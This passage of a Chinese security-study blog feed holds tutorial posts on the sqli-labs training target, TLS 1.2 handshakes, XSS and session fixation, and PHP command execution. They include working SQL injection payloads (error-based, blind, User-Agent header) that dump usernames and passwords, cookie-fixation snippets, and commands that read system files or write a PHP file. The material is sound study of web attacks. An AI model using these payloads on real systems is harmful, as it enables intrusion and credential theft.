class="hljs-emphasis">&#x27;users&#x27;</span>)))--+<br></code></pre></td></tr></table></figure><p>显示具体数据</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-link">http://</span>[<span class="hljs-string">靶机IP</span>]/sqli-labs/Less-1/?id=1&#x27; and extractvalue(1,concat(<span class="hljs-emphasis">&#x27;~&#x27;</span>,(select concat_ws(<span class="hljs-emphasis">&#x27;,&#x27;</span>,id,username,password) from security.users limit 0,1)))--+<br></code></pre></td></tr></table></figure><h2 id="SQL盲注"><a href="#SQL盲注" class="headerlink" title="SQL盲注"></a>SQL盲注</h2><h3 id="盲注常用函数"><a href="#盲注常用函数" class="headerlink" title="盲注常用函数"></a>盲注常用函数</h3><p><img src="https://s2.loli.net/2023/11/10/NCBcWZYF7TkAvU8.png" alt="image-20231110103535478"></p><ul><li>if()</li></ul><p>​语法格式：if(expr1,expr2,expr3)：expr1为true则返回exprz,expr1为false则返回expr3.<br>     注：仅MySQL支持。</p><ul><li>left()</li></ul><p>​语法格式：left(str.length)，如果str或length参数为NULL，则返回NULL值。<br>​str：要提取子串的字符串。<br>​length：正整数，指定将从左边返回的字符数。length 0或为负，则LEFT返回一个空字符串，length大于str字符串的长度，则leftQ返回整个str字符串。</p><ul><li><p>length()</p></li><li><p>substr(),substring()</p><p>substr(str,pos,len),substring(str,pos,len)</p><p>指定位置开始截取</p></li><li><p>ascii(),ord():返回最左端的ascii值</p></li><li><p>cast(),convert()</p></li><li><p>sleep()</p></li><li><p>benchmark(count,expr):让expr执行count次</p></li></ul><h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><p><strong>实验</strong></p><p>盲猜网站当前所在数据库的库名长度，例如执行如下payload：</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-link">http://</span>[<span class="hljs-string">靶机IP</span>]/sqli-labs/Less-8/?id=1&#x27; and length(database())=7--+<br></code></pre></td></tr></table></figure><p>盲猜网站当前所在数据库的库名字符串,逐个盲猜</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-link">http://</span>[<span class="hljs-string">靶机IP</span>]/sqli-labs/Less-8/?id=1&#x27; and substr(database(),1,1)=<span class="hljs-emphasis">&#x27;s&#x27;</span>--+<br></code></pre></td></tr></table></figure><p>盲猜表名，逐个盲猜</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-link">http://</span>[<span class="hljs-string">靶机IP</span>]/sqli-labs/Less-8/?id=1&#x27; and substr((select table_name from information_schema.tables where table_schema=<span class="hljs-emphasis">&#x27;security&#x27;</span> limit 0,1),1,1)=<span class="hljs-emphasis">&#x27;e&#x27;</span>--+<br></code></pre></td></tr></table></figure><p>盲猜users表的全部字段名，逐个盲猜</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-link">http://</span>[<span class="hljs-string">靶机IP</span>]/sqli-labs/Less-8/?id=1&#x27; and substr((select column_name from information_schema.columns where table_schema=<span class="hljs-emphasis">&#x27;security&#x27;</span> and table_name=<span class="hljs-emphasis">&#x27;users&#x27;</span> limit 0,1),1,1)=<span class="hljs-emphasis">&#x27;i&#x27;</span>--+<br></code></pre></td></tr></table></figure><p>盲猜表中数据，逐个盲猜</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-link">http://</span>[<span class="hljs-string">靶机IP</span>]/sqli-labs/Less-8/?id=1&#x27; and substr((select concat_ws(<span class="hljs-emphasis">&#x27;,&#x27;</span>,username,password) from security.users limit 0,1),1,1)=<span class="hljs-emphasis">&#x27;D&#x27;</span>--+<br></code></pre></td></tr></table></figure><h3 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h3><p><strong>实验</strong></p><p>使用sleep()函数判断注入点类型：</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-link">http://</span>[<span class="hljs-string">靶机IP</span>]/sqli-labs/Less-9/?id=1 and sleep(5)--+<br></code></pre></td></tr></table></figure><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-link">http://</span>[<span class="hljs-string">靶机IP</span>]/sqli-labs/Less-9/?id=1&#x27; and sleep(5)--+<br></code></pre></td></tr></table></figure><p>根据延迟猜测数据库名长度：</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-link">http://</span>[<span class="hljs-string">靶机IP</span>]/sqli-labs/Less-9/?id=1&#x27; and if(length(database())=7,sleep(5),1)--+<br></code></pre></td></tr></table></figure><p>后面方法基本类似于之前实验，只要构造if() 语句的第一个参数就好。</p><h2 id="http文件头注入"><a href="#http文件头注入" class="headerlink" title="http文件头注入"></a>http文件头注入</h2><p>常见的HTTP Header注入类型包括Cookie注入、Referer注入、User-Agent注入、XFF注入等(注入</p><p>位置)。</p><p><strong>实验</strong></p><p>在原始HTTP请求包的头部字段User-Agent末尾添加单引号，即使用如下payload：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">User</span>-Agent:Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span>......Firefox/<span class="hljs-number">46</span>.<span class="hljs-number">0</span>&#x27;<br></code></pre></td></tr></table></figure><p>发现服务器端报错！</p><p>在原始HTTP请求包的头部字段User-Agent末尾添加如下符号，使用如下payload：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">User</span>-Agent:Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span>......Firefox/<span class="hljs-number">46</span>.<span class="hljs-number">0</span>&#x27;,&#x27;&#x27;,&#x27;&#x27;)#<br></code></pre></td></tr></table></figure><p>服务器端未报错！</p><p>由此可以判断，目标网站在POST参数处存在字符型注入点。</p><p>注：如果在服务器端（靶机）上查看Less-18的php代码，会发现其中存在这样一段代码：</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">$insert=<span class="hljs-string">&quot;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&#x27;$uagent&#x27;, &#x27;$IP&#x27;, $uname)&quot;</span><span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>使用以下payload获取网站当前所在数据库的库名：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">User</span>-Agent:Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span>......Firefox/<span class="hljs-number">46</span>.<span class="hljs-number">0</span>&#x27; and extractvalue(<span class="hljs-number">1</span>,concat(&#x27;~&#x27;,database())),&#x27;&#x27;,&#x27;&#x27;)#<br></code></pre></td></tr></table></figure><p>显示结果为security。</p><p>使用以下payload获取数据库security的全部表名：</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp">User-Agent:Mozilla/<span class="hljs-number">5.0</span>......Firefox/<span class="hljs-number">46.0&#x27;</span> <span class="hljs-function"><span class="hljs-keyword">and</span> <span class="hljs-title">extractvalue</span>(<span class="hljs-params"><span class="hljs-number">1</span>,concat(<span class="hljs-string">&#x27;~&#x27;</span>,(<span class="hljs-keyword">select</span> group_concat(table_name</span>) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema</span>=<span class="hljs-string">&#x27;security&#x27;</span>))),<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>)<span class="hljs-meta">#</span><br></code></pre></td></tr></table></figure><p>以下步骤同之前类似。</p>]]></content>
    
    
    <categories>
      
      <category>渗透</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>aboutHTTPS</title>
    <link href="/2023/11/16/HTTPS%E5%8D%8F%E8%AE%AE/"/>
    <url>/2023/11/16/HTTPS%E5%8D%8F%E8%AE%AE/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h1 id="HTTPS协议（TLS-v1-2）"><a href="#HTTPS协议（TLS-v1-2）" class="headerlink" title="HTTPS协议（TLS v1.2）"></a>HTTPS协议（TLS v1.2）</h1><h2 id="概括介绍"><a href="#概括介绍" class="headerlink" title="概括介绍"></a>概括介绍</h2><p>总体流程：</p><p>四次握手</p><img src="https://s2.loli.net/2023/11/08/V4uDORrZh6xEP81.png" alt="image-20231108200139162" style="zoom:55%;" /><p>TLS&#x2F;SSL协议结构分层：</p><p>网图如下：</p><img src="https://s2.loli.net/2023/11/08/YrgFohC96buVGNw.png" alt="image-20231108201059958" style="zoom:55%;" /><img src="https://s2.loli.net/2023/11/08/QPN3vGwd9sgJYph.png" alt="image-20231108201124713" style="zoom:55%;" /><p>Handshake 协议有很多种类：Client Hello，Server Hello，Server Certificate 等，是握手的核心。</p><p>Change Cipher Spec 协议是有点独立的协议，也是握手必须的。用于告诉对方，我要使用我们商量好的会话秘钥了。</p><p>Alert 协议用于警告双方握手过程没有成功。</p><h2 id="具体握手过程"><a href="#具体握手过程" class="headerlink" title="具体握手过程"></a>具体握手过程</h2><p>注，一次握手可包含多个 Message，比如 server 一次握手可能包含 Server Hello、Server Certificate、Server Key Exchange 等，以此类推。</p><p>主要是RSA和ECDHE两种密钥交换算法。</p><p>下面介绍<strong>ECDHE</strong>:</p><h3 id="client第一次握手：Client-Hello"><a href="#client第一次握手：Client-Hello" class="headerlink" title="client第一次握手：Client Hello"></a>client第一次握手：Client Hello</h3><ul><li><p>Version</p></li><li><p>Random：<strong>客户端随机数</strong>，我们称之为随机数 1，这个随机数是为了后面生成对称的<strong>会话秘钥</strong>。</p></li><li><p>Session ID：可选的字段。</p></li><li><p>Cipher Suites：加密套件。提供一组，可供选择</p></li><li><p>Compression Methods：压缩算法，<strong>在加密之前数据压缩</strong>。取值 00 代表不压缩。因为会弱化加密数据的安全性，所以在未来的版本已经不推荐使用了。</p></li></ul><h3 id="server第一次握手"><a href="#server第一次握手" class="headerlink" title="server第一次握手"></a>server第一次握手</h3><h4 id="Server-Hello"><a href="#Server-Hello" class="headerlink" title="Server Hello"></a>Server Hello</h4><ul><li><p>Version：选定的协议。没协商好会有alert协议</p></li><li><p>Cipher Suite：选定的加密套件。</p></li><li><p>random：<strong>服务端随机数</strong>。</p></li><li><p>compression method</p></li></ul><h4 id="server-Certificate"><a href="#server-Certificate" class="headerlink" title="server Certificate"></a>server Certificate</h4><ul><li>the hostname of the server</li><li>the public key used by this server</li><li>proof from a trusted third party that the owner of this hostname holds the private key for this public key</li></ul><h4 id="（Server-Key-Exchange）"><a href="#（Server-Key-Exchange）" class="headerlink" title="（Server Key Exchange）"></a>（Server Key Exchange）</h4><p>交换公钥</p><h4 id="Server-Hello-Done"><a href="#Server-Hello-Done" class="headerlink" title="Server Hello Done"></a>Server Hello Done</h4><p>后面三条封装在一个包中</p><h3 id="client第二次握手"><a href="#client第二次握手" class="headerlink" title="client第二次握手"></a>client第二次握手</h3><h4 id="Client-Key-Exchange"><a href="#Client-Key-Exchange" class="headerlink" title="Client Key Exchange"></a>Client Key Exchange</h4><p>交换公钥</p><p>The client provides information for key exchange. As part of the key exchange process both the server and the client will have a keypair of public and private keys, and will send the other party their public key. The shared encryption key will then be generated using a combination of each party’s private key and the other party’s public key.</p><p>The parties have agreed on a cipher suite using ECDHE, meaning the keypairs will be based on a selected <strong>E</strong>lliptic <strong>C</strong>urve, <strong>D</strong>iffie-<strong>H</strong>ellman will be used, and the keypairs are <strong>E</strong>phemeral (generated for each connection) rather than using the public&#x2F;private key from the certificate.</p><h4 id="Change-Cipher-Spec"><a href="#Change-Cipher-Spec" class="headerlink" title="Change Cipher Spec"></a>Change Cipher Spec</h4><p>{</p><p>客户端计算密钥：</p><p>The client now has the information to calculate the encryption keys that will be used by each side. It uses the following information in this calculation:</p><ul><li>server random (from Server Hello)</li><li>client random (from Client Hello)</li><li>server public key (from Server Key Exchange)</li><li>client private key (from Client Key Generation)</li></ul><p>}</p><p>告诉 server，要使用商量好的对称秘钥了。请注意，这里是独立的协议，即 Change Cipher Spec Protocol。</p><h4 id="Encrypted-Handshake-Message"><a href="#Encrypted-Handshake-Message" class="headerlink" title="Encrypted Handshake Message"></a>Encrypted Handshake Message</h4><p>为了验证握手是否成功且未被篡改。加密之前的握手消息的哈希值。</p><h3 id="server第二次握手"><a href="#server第二次握手" class="headerlink" title="server第二次握手"></a>server第二次握手</h3><h4 id="Change-Cipher-Spec-1"><a href="#Change-Cipher-Spec-1" class="headerlink" title="Change Cipher Spec"></a>Change Cipher Spec</h4><h4 id="Encrypted-Handshake-Message-1"><a href="#Encrypted-Handshake-Message-1" class="headerlink" title="Encrypted Handshake Message"></a>Encrypted Handshake Message</h4><p>验证数据根据所有握手消息的哈希值构建，用于验证握手过程的完整性</p><p><strong>使用RSA密钥交换算法</strong>：</p><p>使用 RSA 秘钥交换算法的四次握手的过程和 ECDHE 过程大体一样，如下：</p><ul><li>Bob 第一次握手：Bob 请求建立 TLS 连接，发送<strong>协议版本、加密套件、</strong>一个随机数 <strong>client random</strong> 以及支持的压缩算法给 Alice；</li><li>Alice 第一次握手：Alice 根据 Bob 提供的加密套件和自己支持的情况，选择其中的一种加密套件，选定协议版本，加上<strong>第二个随机数 server random</strong>，和<strong>数字证书（其中有公钥）</strong>，发送给 Bob；</li><li>Bob 第二次握手：Bob 确认这个<strong>数字证书是有效的</strong>，并且再生成第三个随机数-<strong>预秘钥</strong>，即PreMaster key（premastersecret）。将这个PreMaster key用服务器发送给它的数字证书中的<strong>公钥进行加密</strong>发送给服务器；以及放一个<strong>ChangeCipherSpec消息即编码改变</strong>的消息，还有<u>整个前面所有消息的hash值</u>。客户端使用前面的两个随机数以及刚刚新生成的新随机数，使用与服务器确定的加密算法，生成会话秘钥Session key。</li></ul><p>这里，没有发送 ECDHE 算法交换中的消息 <strong>Server Key Exchange</strong>。</p><p><img src="https://pic1.zhimg.com/80/v2-ba6918091113c294b1ae0a94500e1d24_1440w.webp" alt="img"></p><ul><li>Alice 第二次握手：Alice 收到 Bob 的回复，利用自己的<strong>私钥进行解密</strong>，获得这个随机数，然后通过将前面这<strong>三个随机数</strong>以及他们协商的加密方式，计算生成一个会话密钥 session key（session secret）。服务端也会使用 Session key 加密一段 Finish 消息发送给客户端，以验证之前通过握手建立起来的加解密通道是否成功。</li></ul><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://zhuanlan.zhihu.com/p/421446218">https://zhuanlan.zhihu.com/p/421446218</a></p><p><a href="https://tls12.xargs.org/">https://tls12.xargs.org/</a></p><p><a href="https://www.cnblogs.com/wusanga/p/17383505.html">https://www.cnblogs.com/wusanga/p/17383505.html</a></p>]]></content>
    
    
    <categories>
      
      <category>others</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>XSS</title>
    <link href="/2023/11/16/xss/"/>
    <url>/2023/11/16/xss/</url>
    
    <content type="html"><![CDATA[<h1 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h1><h2 id="session管理"><a href="#session管理" class="headerlink" title="session管理"></a>session管理</h2><ul><li>server端session</li><li>cookie-based</li><li>token-based</li></ul><span id="more"></span><h2 id="session攻击"><a href="#session攻击" class="headerlink" title="session攻击"></a>session攻击</h2><h3 id="会话劫持"><a href="#会话劫持" class="headerlink" title="会话劫持"></a>会话劫持</h3><p>中间人攻击。</p><h3 id="会话固定"><a href="#会话固定" class="headerlink" title="会话固定"></a>会话固定</h3><p>含义：想办法重置用户session id，目标用户携带攻击者设定的session id登录。</p><h4 id="攻击方法"><a href="#攻击方法" class="headerlink" title="攻击方法"></a>攻击方法</h4><ol><li><p>客户端脚本：</p><p>httponly</p></li></ol><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"> <span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span>=<span class="hljs-string">&quot;PHPSESSID=99999&quot;</span> ;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><ol start="2"><li>使用HTML的<META>标签加Set-Cookie属性。</li></ol><p>服务器可以在返回的HTML文档中增加<meta>标签来设置Cookie</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&#x27;Set-Cookie&#x27;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&#x27;PHPSESSID=23333&#x27;</span>&gt;</span><br></code></pre></td></tr></table></figure><ol start="3"><li>set-cookie</li></ol><p>攻击者使用一些方法在web服务器的响应中加入Set-cookie的HTTP响应头部。</p><h4 id="防御方法"><a href="#防御方法" class="headerlink" title="防御方法"></a>防御方法</h4><p>1、每当用户登陆的时候就进行重置Session lD</p><p>2、Session ID闲置过久时，进行重置Session lD</p><p>3、大部分防止会话劫持的方法对会话固定攻击同样有效。如设置HttpOnly，关闭透明化Session lD,User-Agent验证，Token校验等。</p><h2 id="Cookie安全"><a href="#Cookie安全" class="headerlink" title="Cookie安全"></a>Cookie安全</h2><h3 id="Cookie字段"><a href="#Cookie字段" class="headerlink" title="Cookie字段"></a><strong>Cookie字段</strong></h3><p>setcookie()函数用于设置cookie</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-attr">[name]</span><span class="hljs-selector-attr">[value]</span><span class="hljs-selector-attr">[expires]</span><span class="hljs-selector-attr">[path]</span><span class="hljs-selector-attr">[domain]</span><span class="hljs-selector-attr">[secure]</span><span class="hljs-selector-attr">[httponly]</span><br></code></pre></td></tr></table></figure><h3 id="Cookie存储"><a href="#Cookie存储" class="headerlink" title="Cookie存储"></a><strong>Cookie存储</strong></h3><p>本地Cookie：设置了过期时间</p><p>内存Cookie：未设置过期时间，随浏览器关闭消失</p><p>攻击者可以将内存Cookie转换为本地Cookie</p><h2 id="XSS类型"><a href="#XSS类型" class="headerlink" title="XSS类型"></a>XSS类型</h2><ul><li><p>反射性</p></li><li><p>存储型（持久型）</p></li><li><p>DOM型</p></li></ul><p>（xss数据接收平台：<a href="https://xssaq.com/%EF%BC%89">https://xssaq.com/）</a></p><h2 id="XSS防御"><a href="#XSS防御" class="headerlink" title="XSS防御"></a>XSS防御</h2><ul><li><p>Content Security Policy（CSP）</p></li><li><p>HTTPOnly</p></li></ul><h2 id="JSONP劫持漏洞"><a href="#JSONP劫持漏洞" class="headerlink" title="JSONP劫持漏洞"></a>JSONP劫持漏洞</h2><p>SOP，同源策略 (Same Origin Policy)，指不同域的客户端脚本在没有明确授权的情况下，不能读写对方的资源。</p><p>JSONP （JSON with padding）：动态创建<code>&lt;script&gt;</code>标签，然后利用<code>&lt;script&gt;</code>的<strong>src 不受同源策略约束</strong>来跨域获取数据。</p><h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h2><p><a href="https://tech.meituan.com/2018/10/11/fe-security-csrf.html">前端安全系列（二）：如何防止CSRF攻击？ - 美团技术团队 (meituan.com)</a></p>]]></content>
    
    
    <categories>
      
      <category>渗透</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>命令执行</title>
    <link href="/2023/11/16/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    <url>/2023/11/16/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h1 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h1><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><h3 id="管道符概述"><a href="#管道符概述" class="headerlink" title="管道符概述"></a>管道符概述</h3><p>Linux常用管道符：<br>;前面的执行完执行后面的<br>|是管道符，显示后面的执行结果<br>||当前面的执行出错时执行后面的</p><p>Windows常用管道符<br>&amp;前面的语句为假则直接执行后面的<br>&amp;&amp;前面的语句为假则直接出错，后面的也不执行<br>|直接执行后面的语句<br>||前面出错执行后面的</p><h3 id="常见执行函数概述"><a href="#常见执行函数概述" class="headerlink" title="常见执行函数概述"></a>常见执行函数概述</h3><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs stylus">PHP中常见代码执行函数：<br><span class="hljs-function"><span class="hljs-title">array_map</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-title">eval</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-title">assert</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-title">preg_replace</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-title">call_user_func</span><span class="hljs-params">()</span></span><br><span class="hljs-variable">$a</span>(<span class="hljs-variable">$b</span>)动态函数<br><br>PHP中常见系统命令执行函数：<br><span class="hljs-function"><span class="hljs-title">system</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-title">exec</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-title">shell_exec</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-title">passthru</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-title">popen</span><span class="hljs-params">()</span></span><br>反引号<br></code></pre></td></tr></table></figure><h2 id="代码执行函数"><a href="#代码执行函数" class="headerlink" title="代码执行函数"></a>代码执行函数</h2><p><strong>array_map</strong>()</p><p>array_map 一为数组的每个元素应用回调函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">array_map</span>(<span class="hljs-keyword">callable</span> <span class="hljs-variable">$callback</span>,<span class="hljs-keyword">array</span> <span class="hljs-variable">$array</span>，<span class="hljs-keyword">array</span> ...<span class="hljs-variable">$arrays</span>): <span class="hljs-keyword">array</span><br></code></pre></td></tr></table></figure><p><strong>eval()</strong></p><p>略</p><p><strong>assert()</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-title function_ invoke__">assert</span> ( <span class="hljs-keyword">mixed</span> <span class="hljs-variable">$assertion</span> [ ，<span class="hljs-built_in">Throwable</span> <span class="hljs-variable">$exception</span> ] ) : <span class="hljs-keyword">bool</span><br></code></pre></td></tr></table></figure><p>如果assertion是字符串，它将会被assert()当做PHP代码来执行。assertion是字符串的优势是当禁用断言时它的开销会更小，并且在断言失败时消息会包含assertion表达式。这意味着如果你传入了boolean的条件作为assertion，这个条件将不会显示为断言函数的参数;在调用你定义的assert_options()处理函数时，条件会转换为字符串，而布尔值FALSE会被转换成空字符串。</p><p><strong>preg_replace()</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-title function_ invoke__">preg_replace</span> ( <span class="hljs-keyword">mixed</span> <span class="hljs-variable">$pattern</span> , <span class="hljs-keyword">mixed</span> <span class="hljs-variable">$replacement</span> , <span class="hljs-keyword">mixed</span> <span class="hljs-variable">$subject</span> [, <span class="hljs-keyword">int</span> <span class="hljs-variable">$limit</span> = -<span class="hljs-number">1</span> [,int8<span class="hljs-variable">$count</span> ]] ) : <span class="hljs-keyword">mixed</span><br></code></pre></td></tr></table></figure><p>preg_replace函数的作用是搜索subject中正则匹配pattern的部分，以replacement进行替换。pattern：要搜索的模式，可以是一个字符串或字符串数组。当pattern出存在一个“&#x2F;e”修饰符时，$replacement的值会被当成php代码来执行。</p><p><strong>call_user_func()</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">call_user_func</span>( <span class="hljs-keyword">callable</span> <span class="hljs-variable">$callback</span> [, <span class="hljs-keyword">mixed</span> <span class="hljs-variable">$parameter</span> [, <span class="hljs-keyword">mixed</span> $...]] ) : <span class="hljs-keyword">mixed</span><br></code></pre></td></tr></table></figure><p>call_user_func函数的作用是回调函数，把第一个参数作为回调函数使用，其余参数都是回调函数的参数。</p><p><strong>魔术常量</strong></p><p>探测到网站存在远程命令执行漏洞，可以利用PHP魔术常量获取相关信息。<br>PHP 向它运行的任何脚本提供了大量的预定义常量。不过很多常量都是由不同的扩展库定义的，只有在加载了这些扩展库时才会出现，或者动态加载后，或者在编译时已经包括进去了。有八个魔术常量它们的值随着它们在代码中的位置改变而改变。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">__LINE__</span>       文件中的当前行号<br><span class="hljs-attribute">__FILE__</span>       文件的完整路径和文件名。如果用在被包含文件中，则返回被包含的文件名<br><span class="hljs-attribute">__DIR__</span>        文件所在的目录。如果用在被包括文件中，则返回被包括的文件所在的目录<br><span class="hljs-attribute">__FUNCTION__</span>   该常量所在的函数名称（PHP <span class="hljs-number">4</span>.<span class="hljs-number">3</span>.<span class="hljs-number">0</span> 新加）。自PHP5起本常量返回该函数被定义时的名字（区分大小写）。在PHP4中该值总是小写字母的<br><span class="hljs-attribute">__CLASS__</span>      该类被定义时的名字（PHP <span class="hljs-number">4</span>.<span class="hljs-number">3</span>.<span class="hljs-number">0</span> 新加）。自PHP5起本常量返回该类被定义时的名字（区分大小写）<br><span class="hljs-attribute">__TRAIT__</span>      Trait的名字（PHP <span class="hljs-number">5</span>.<span class="hljs-number">4</span>.<span class="hljs-number">0</span> 新加）。自PHP5.<span class="hljs-number">4</span>.<span class="hljs-number">0</span>起，PHP实现了代码复用的一个方法，称为traits<br><span class="hljs-attribute">__METHOD__</span>     类的方法名（PHP <span class="hljs-number">5</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span> 新加）。返回该方法被定义时的名字（区分大小写）<br><span class="hljs-attribute">__NAMESPACE__</span>  当前命名空间的名称（区分大小写）。此常量是在编译时定义的（PHP <span class="hljs-number">5</span>.<span class="hljs-number">3</span>.<span class="hljs-number">0</span> 新增）<br></code></pre></td></tr></table></figure><p><strong>读取文件</strong></p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">a</span>=<span class="hljs-function"><span class="hljs-title">var_dump</span>(<span class="hljs-title">file_get_contents</span>(<span class="hljs-string">&quot;C:\Windows\System32\drivers\etc\hosts&quot;</span>))</span><br></code></pre></td></tr></table></figure><h2 id="系统命令执行函数"><a href="#系统命令执行函数" class="headerlink" title="系统命令执行函数"></a>系统命令执行函数</h2><p>系统命令执行漏洞有以下一些利用方式:</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">?a=type c:\windows\system32\drivers\etc\hosts   查看文件</span><br><span class="language-xml">?a=echo &quot;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-meta">?&gt;</span></span><span class="language-xml">&quot;&gt;E:\xampp\htdocs\phplos\phpinfo.php   写shell</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>渗透</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>SSTI漏洞</title>
    <link href="/2023/10/27/SSTI%E6%BC%8F%E6%B4%9E/"/>
    <url>/2023/10/27/SSTI%E6%BC%8F%E6%B4%9E/</url>
    
